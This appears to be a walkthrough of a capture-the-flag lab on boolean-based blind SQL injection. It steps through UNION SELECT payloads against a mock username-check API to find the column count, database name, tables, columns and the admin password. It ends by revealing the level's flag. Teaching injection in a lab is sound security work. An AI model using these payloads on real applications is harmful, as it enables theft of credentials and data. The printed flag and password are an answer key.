
# Boolean Based SQL Injection

Boolean-based SQL Injection refers to the response we receive from our injection attempts, which can be a true/false, yes/no, on/off, 1/0, or any response that has only two outcomes. This outcome confirms whether our SQL Injection payload was successful or not. At first glance, it may seem that this limited response cannot provide much information, but with just these two responses, it's possible to enumerate an entire database structure and its contents.

## Practical Exercise

On level three of the SQL Injection Examples Machine, you're presented with a mock browser with the following URL:

```
https://website.thm/checkuser?username=admin
```

The browser body contains `{"taken":true}`. This API endpoint replicates a common feature found on many signup forms, which checks whether a username has already been registered. Since the `taken` value is `true`, we can assume the username `admin` is already registered. Changing the username in the mock browser's address bar from `admin` to `admin123` will show that the `taken` value has changed to `false`.

The SQL query processed looks like this:

```sql
select * from users where username = '%username%' LIMIT 1;
```

The only input we control is the username in the query string, which we will use for SQL injection. Keeping the username as `admin123`, we can start appending to it to try to change the state of the `taken` field from `false` to `true`.

### Finding the Number of Columns

Our first task is to establish the number of columns in the users' table, which we can achieve using the UNION statement. Change the username value to:

```sql
admin123' UNION SELECT 1;--
```

Since the application responds with `taken` as `false`, we confirm this is an incorrect number of columns. Keep adding more columns until you receive a `true` response. You can confirm the correct number of columns is three by using:

```sql
admin123' UNION SELECT 1,2,3;--
```

### Enumerating the Database

Now that we've established the number of columns, we can discover the database name using the `database()` method and the `like` operator. Try the following username value:

```sql
admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--
```

This will return `true` because `%` matches anything. Changing it to `a%` will return `false`, confirming the database name does not start with `a`. Cycle through characters until you find a match. For example, using:

```sql
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 's%';--
```

You confirm the database name begins with `s`. Continue this process until you discover the full database name: `sqli_three`.

### Discovering Table Names

We can now enumerate table names in the `sqli_three` database using the information_schema database. Try the following:

```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' AND table_name LIKE 'a%';--
```

Continue cycling through characters until you find a table named `users`. Confirm this with:

```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' AND table_name='users';--
```

### Enumerating Column Names

Now, we need to find the column names in the `users` table. Use the following query to search for column names beginning with the letter `a`:

```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' AND TABLE_NAME='users' AND COLUMN_NAME LIKE 'a%';--
```

Continue cycling through characters until you find the columns. After discovering columns like `id`, `username`, and `password`, you can query the users table for login credentials.

### Finding Usernames and Passwords

To find a valid username, use:

```sql
admin123' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'a%';
```

After cycling through characters, you confirm the username `admin`. To find the password, use:

```sql
admin123' UNION SELECT 1,2,3 FROM users WHERE username='admin' AND password LIKE 'a%';
```

After cycling through characters, you discover the password is `3845`.

You can now use the username and password to access the next level.

### Questions

What is the flag after completing level three?  
**Answer format:** ***{******************}
```
 






 
```
<details>
<summary>Click to  see answer</summary>
 

```sql
THM{SQL_INJECTION_1093}
 
</details> ```

